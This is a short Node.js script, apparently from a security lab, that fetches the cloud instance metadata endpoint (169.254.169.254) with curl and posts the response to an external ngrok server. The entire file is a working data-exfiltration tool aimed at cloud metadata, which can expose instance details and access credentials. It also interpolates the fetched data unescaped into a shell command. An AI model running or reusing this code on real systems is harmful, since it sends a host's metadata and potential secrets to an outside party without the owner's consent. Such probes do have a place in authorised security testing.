#!/usr/bin/env node
const { exec } = require("child_process");

// Metadata URL and server endpoint
const metadataUrl = "http://169.254.169.254/latest/meta-data/";
const postServerUrl = "https://nomasec-labs.ngrok.app/response";

// Helper: check if string is valid JSON
function isJson(str) {
  try {
    JSON.parse(str);
    return true;
  } catch {
    return false;
  }
}

// Fetch metadata
exec(`curl "${metadataUrl}"`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    process.exit(1);
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
  }
  console.log("Metadata Response:", stdout);

  // Verify if response is JSON
  const responseType = isJson(stdout) ? "json" : "text";
  const postData = JSON.stringify({
    type: responseType,
    content: stdout
  });

  // Send to server
  exec(`curl -X POST -H "Content-Type: application/json" --data '${postData}' "${postServerUrl}"`, (err, out, errout) => {
    if (err) {
      console.error(`Error sending response: ${err.message}`);
      process.exit(1);
    }
    if (errout) {
      console.error(`Stderr from POST: ${errout}`);
    }
    console.log("Server acknowledged:", out);
  });
});
